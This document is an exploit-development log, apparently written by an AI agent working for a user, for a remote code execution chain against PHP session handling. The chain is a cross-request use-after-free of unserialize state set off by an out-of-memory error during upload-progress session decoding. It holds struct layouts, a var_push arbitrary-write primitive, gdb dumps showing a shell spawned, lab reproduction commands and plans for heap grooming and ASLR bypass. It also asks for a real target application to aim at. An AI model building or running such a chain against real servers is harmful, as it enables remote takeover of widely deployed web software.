# New root cause: pre-RINIT `BG(unserialize)` cross-request leftover UAF (pure HTTP line)

This file records the new exploit chain provided by the user and this line's independent reproduction progress. **The previous `session_unset`/`session_encode` custom-PHP exploits are no longer counted as valid results** (they violate the "no target-specific PHP, fully remote" requirement); the related pages have been moved out of the webroot.

---

## 1. The new chain (user intelligence)

1. The first request OOMs while decoding a large session via upload-progress, leaving `BG(unserialize).level=1` and a **freed `data`**.
2. The second request reclaims that 8216-byte object via two 8214-byte multipart parameters.
3. Backslash folding is used to construct a legal 48-bit `data->last` pointer.
4. A binary progress marker forges `var_entries`, turning `var_push` into an arbitrary-address write.
5. A two-level `var_entries` trampoline ultimately overwrites `zend_object->handlers`.
6. Object destruction enters a glibc one-gadget; GDB confirmed:
   ```
   VAR_PUSH ... destination=0x7f9d62671000 rval=0x7f9d62664980
   VAR_PUSH ... destination=0x7f9d62602608 rval=0x7f9d62664940
   process 2544 is executing new program: /usr/bin/dash
   ```

The vulnerability is not the progress cache bucket UAF claimed in public analysis, but **cross-request leftover of `BG(unserialize)` state in the pre-RINIT phase**.

---

## 2. Source mapping

### 2.1 The 8216-byte object

`ext/standard/var_unserializer.re`:

```c
#define VAR_ENTRIES_MAX 1018
typedef struct {
    zend_long used_slots;     // 8
    void *next;               // 8
    zval *data[1018];         // 8144
} var_entries;                // 8160

struct php_unserialize_data {
    var_entries      *last;          // 0
    var_dtor_entries *first_dtor;    // 8
    var_dtor_entries *last_dtor;     // 16
    HashTable        *allowed_classes; // 24
    HashTable        *ref_props;     // 32
    zend_long         cur_depth;     // 40
    zend_long         max_depth;     // 48
    var_entries       entries;       // 56
};                                    // sizeof = 56 + 8160 = 8216
```

gdb has confirmed `sizeof(struct php_unserialize_data) == 8216`.

### 2.2 Lifecycle

```c
php_var_unserialize_init():
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(8216);
        d->last = &d->entries;
        ...
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;   // stale reuse
        ++BG(unserialize).level;
    }

php_var_unserialize_destroy():
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d); efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level)
        BG(unserialize).data = NULL;
```

An OOM/`zend_bailout` skips `PHP_VAR_UNSERIALIZE_DESTROY`, leaving `level` at 1 and `data` dangling; the next pre-RINIT `unserialize` reuses the structure directly.

### 2.3 The `var_push` write primitive

```c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;
    if (var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = emalloc(sizeof(var_entries));
        ...
        (*var_hashx)->last->next = var_hash;
        (*var_hashx)->last = var_hash;
    }
    var_hash->data[var_hash->used_slots++] = rval;
}
```

If `data->last` is attacker-controlled, the write address is:

```text
*(zval**)(last + offsetof(var_entries, data) + used_slots*8) = rval
= last + 16 + used_slots*8
```

`rval` is a `zval*` (a predictable unserializer temporary value address); `used_slots` can also be controlled via reclaimed content. A two-level trampoline can use the pointer written the first time as the `last`/target of the second write, ultimately overwriting `zend_object->handlers`, and object destruction enters the one-gadget.

---

## 3. This line's pure HTTP reproduction progress

### 3.1 Prerequisite: creating a large session with upload-progress (pure HTTP)

- The Apache lab config can be toggled: 64M + `session.upload_progress.cleanup Off` for creating files; 8M + cleanup On for A/B.
- Request 0: multipart `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS=<4MB of 'A'>` + file part.
- Measured: `/tmp/sess_bgtest123` = **4,194,655 bytes**.
- Small session: `/tmp/sess_bgsmall123` = 351 bytes, used for normal decoding in the second request.

### 3.2 Request A: post-RINIT decoding of the large session OOMs

The target page is an ordinary session page:

```php
<?php session_start(); echo "ok\n"; ?>
```

Request: `GET /index.php`, `Cookie: PHPSESSID=bgtest123`. The session decodes 4MB of data and OOMs under the 8M limit.

Measured:

```text
HTTP/1.1 200 OK
Fatal error: Allowed memory size of 8388608 bytes exhausted ...

basic_globals.unserialize.level = 1
basic_globals.unserialize.data  = 0x7ffff5e6d000
```

That `data` is a `php_unserialize_data` (8216B); `last=&entries` (+0x38). After request shutdown the object has been freed (BG pointer dangling).

### 3.3 Request B: pre-RINIT reuse of the dangling BG, reclaiming the structure with parameters

Shape (`tools/bg_b.py` / `tools/bg_b_file.py`):

- No file: `PHPSESSID=bgsmall123`, `PHP_SESSION_UPLOAD_PROGRESS=pwn`, and two 8214-byte fields `p1`/`p2` (boundary 10 chars).
- The END cleanup calls `php_session_initialize` → `s_read` → `php_var_unserialize_init` before RINIT, reusing the stale `BG.data`.

Measured gdb:

```text
INIT level=1 data=0x7ffff5e6d000
0x7ffff5e6d000: 0x00007ffff5e6d030 0x41da9b9294603d72
0x7ffff5e6d010: 0x00007ffff5e6d020 0x51da9b9294603d72
0x7ffff5e6d020: 0x00007ffff5e6d000 0x71da9b9294603d72
0x7ffff5e6d030: 0x00007ffff5e6d040 0x31da9b9294603d72
INIT level=0 data=(nil)
```

- `BG.level=1` and `data` still at A's address, showing the pre-RINIT reuse succeeded;
- the 8216 structure has been rewritten by the multipart content; fields like `data->last` became pointers pointing inside the structure (0x...6d030/6d020/6d000/6d040);
- in the with-file version (`bg_b_file.py`), during decoding at FILE_START the structure is reclaimed by multipart header content such as `a.bin`/`Content-`, and then crashes dereferencing `last_dtor` at `tmp_var`:

```text
INIT level=1 data=0x7ffff5e6d000
0x...6d000: 0x0000006e69622e61 0x554acc7090e8c40e
0x...6d010: 0x2d746e65746e6f43 0x354acc0065707954
0x...6d020: 0x00007ffff5e6d040 0x554acc7090e8c40e
SIGSEGV addr=(nil)
#0 tmp_var (num=1, ...)
#1 var_tmp_var
#2 ps_srlzr_decode_php
#3 php_session_decode
#4 php_session_initialize
#5 php_session_rfc1867_update
#6 php_session_rfc1867_callback
#7 rfc1867_post_handler
```

### 3.4 Confirmed facts

- `BG(unserialize).level=1` and `data` survive across requests after A's post-RINIT OOM;
- B's pre-RINIT `php_var_unserialize_init` reuses that dangling `data` (no new allocation);
- two 8214-byte multipart parameters/parser buffers can rewrite the 8216-byte structure;
- the structure fields are used as `var_entries`/`var_dtor_entries` pointers, and `tmp_var`/`var_push` read and write along these pointers (a `tmp_var` crash has already occurred).

### 3.5 Not yet completed

- Using the user chain's "backslash folding" to precisely control `data->last` as an **arbitrary legal 48-bit pointer** instead of the current self-pointer within the structure;
- constructing a fake `var_entries`, controlling `used_slots`, turning `var_push` into a write to an arbitrary target address;
- the two-level trampoline overwriting `zend_object->handlers`, and the glibc one-gadget address (needs a leak under ASLR);
- making A's OOM/large-session preparation a fully remote, repeatable process (currently the lab requires switching the Apache config between 64M/cleanup Off and 8M/cleanup On; a real target depends on the application's own large session and memory_limit).

---

## 4. Reproduction commands (lab)

```bash
# 1) Create sessions with 64M + cleanup Off (pure HTTP)
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 64M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup Off/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
cd ~/php-lab
SID=bgsmall123 python3 bg_create.py 8
SID=bgtest123 python3 bg_create.py 4194304

# 2) 8M + cleanup On; A decodes the large session and OOMs
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 8M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup On/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
python3 bg_cookie_a.py        # GET + Cookie PHPSESSID=bgtest123, confirm OOM

# 3) B: pre-RINIT reuse of BG
python3 bg_b.py               # no file, two 8214 params
# or python3 bg_b_file.py     # with file, decoded at FILE_START
```

gdb observation points:

```gdb
b php_var_unserialize_init
commands
silent
printf "INIT level=%u data=%p\n", basic_globals.unserialize.level, basic_globals.unserialize.data
x/8gx basic_globals.unserialize.data
continue
end
```

---

## 5. Relation to the older documents

- The `session_unset`/`session_encode` custom-PHP exploits of Sections 3/10 of `NOTES.md` are **no longer counted as valid deliverables**; they proved Defect D/the leak mechanisms, but violate the current "no target-side specific PHP, pure HTTP" constraint.
- The old exploit pages were moved to `~/php-lab/offline/`; the webroot keeps only an ordinary `index.php`.
- The new line continues with the `BG(unserialize)` UAF as the target; the next core step is the precise layout of the 8216 structure's fields and the `var_push` two-level write.

---

## 6. Reference logs

- `logs/bg_gf.log` — post-RINIT A + B pre-RINIT `INIT level=1` (version where the structure was not overwritten by parameters).
- `logs/bg_gi.log` — post-RINIT A + B with file; the structure was reclaimed by multipart content and crashed at `tmp_var`.
- `logs/bg_gj.log` — post-RINIT A + B without file, two 8214 parameters, in-structure self-pointers.

---

## 7. 2026-10-21 addition: watchpoint-revealed allocator behavior (last obstacle before RCE)

Hardware watchpoint on A's `BG.data` (here `0x7ffff5e6d000`), then send B (no file, two 8214 parameters), yielding:

```text
WATCH#1 val=0x7461642d6d726f66   # "form-data"
  #0 memcpy
  #1 _estrndup
  #2 php_ap_getword
  #3 rfc1867_post_handler
WATCH#2 val=0x7ffff5e6d010
  #0 zend_mm_set_next_free_slot
  #1 zend_mm_free_small (bin_num=1, ptr=0x7ffff5e6d000)
  #2 zend_mm_free_heap
  #3 _efree
  #4 rfc1867_post_handler
WATCH#3 val=0x7fff656d616e   # "name="
WATCH#6 val=0x316c6c616d736762 # "bgsmall1" (PHPSESSID value)
  #1 multipart_buffer_read_body
```

Conclusion: in our post-RINIT A scenario, **the 8216-byte `php_unserialize_data` block has been reclaimed by Zend MM and split into 16-byte small bins**; during B's parsing, small strings from `_estrndup("form-data")`, `"name="`, the PHPSESSID value etc. repeatedly occupy `0x...6d000` first; therefore the two 8214 parameters did not occupy that address as one whole block as expected, and what `data->last` reads is the small-bin freelist pointer (0x...6d030 etc.), not an attacker-controlled 48-bit pointer.

`zend_mm_free_small(bin_num=1)` corresponds to the smallest 16-byte bin; `form-data`(10B)/`name=`(6B)/`bgsmall123`(11B) all land in this bin. The struct's 56-byte header was split across four 16B slots at `0x...6d000/6d010/6d020/6d030`, and the freelist overwrites the first qword of each slot.

### Next steps (RCE)

1. **Keep the 8216 block as a large free block**, rather than being split into small bins:
   - try different ways for A to end (pre-RINIT OOM without shutdown vs post-RINIT shutdown; `unclean_shutdown`/`report_memleaks` flags), so that B's startup heap reclamation leaves the block on the large-free chain;
   - or, at the very front of B, first allocate a large 8193/8215 buffer (the two 8214 parameters placed first), claiming the block before small-bin splitting.
2. Once `data->last` is controllable:
   - set `last_dtor=0` so `tmp_var` takes the `emalloc` branch;
   - forge a `var_entries` (`used_slots`, `next`, `data[]`) in the parameter buffers/adjacent large blocks, setting `var_push`'s write target to `zend_object->handlers`;
   - two-level trampoline + object destruction + glibc one-gadget.
3. ASLR comes after RCE: the new chain has no ready-made pure HTTP leak; consider a read/write constructed by the `var_push` write itself, or a controlled OOB read of the same BG UAF; using the earlier custom-PHP `session_encode` leak is again forbidden.

### Evidence

- Raw watchpoint log: `logs/bg_watch.log` (this round's `/tmp/gw.log`).

---

## 8. The real prerequisite for RCE: `BG(serialize_lock)=1` (target-app dependency)

Source verification result:

```c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);                 // frees the 8216 block
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

Only when `BG(serialize_lock) == 1` does the dangling state appear where "**d has been efreed but BG.level is still 1 and BG.data still points to d**"; this is also the origin of large-free blocks (which are not split into small bins by whole-heap shutdown).

Locations of `BG(serialize_lock)++/--`:

- `ext/standard/var_unserializer.re` around lines 277/294: before/after calling the object's `__wakeup` / `__unserialize`;
- before/after class lookup/autoload/unserialize_callback_func calls (around lines 1232/1256/1268);
- `ext/standard/var.c` 855/876: serialize magic methods.

Therefore the first request of the attack chain must be: **the session data contains an object whose `__wakeup`/`__unserialize` (or autoload/unserialize_callback_func) triggers the OOM during decoding**. The OOM's `zend_bailout` skips `BG(serialize_lock)--`, then the outer destroy sees lock=1, `efree(d)` but does not clear BG, leaving the large-free dangling 8216 block.

Our lab's large session contains only arrays/strings (the progress data generated by upload-progress) with no objects with magic methods, so:

- normal decode OOM: destroy never executed, `d` still allocated (our earlier pre-RINIT A's `data` memory was intact);
- post-RINIT OOM + request shutdown: whole-heap reclamation, the 8216 block is split into 16-byte small bins (watchpoint proven), and the 8214 parameters cannot reclaim it as a whole block.

**Conclusion: this chain is unreachable on "a vanilla session page + a purely HTTP-constructed array session"; it requires the target application to put objects with `__wakeup`/`__unserialize` into the session (or configure autoload/unserialize_callback_func).** This is an application-layer dependency, not something B-request parameters can make up.

### Decisions needed to continue

- Allow adding a **verification-only scaffold class** to the lab target page (a large allocation OOM inside `__wakeup`) so the later `var_entries`/`zend_object->handlers`/one-gadget chain can be established first; the final exploit does not include that PHP, treating it only as a stand-in for an existing gadget in the target application.
- Or provide an object/class that enters the session in a real target application (which application, which session key, which magic method); I will construct the large session around that object.
- Until either of the above conditions is obtained, continuing to force it on the vanilla page would rely on forgeries/custom PHP, which violates the current constraint.
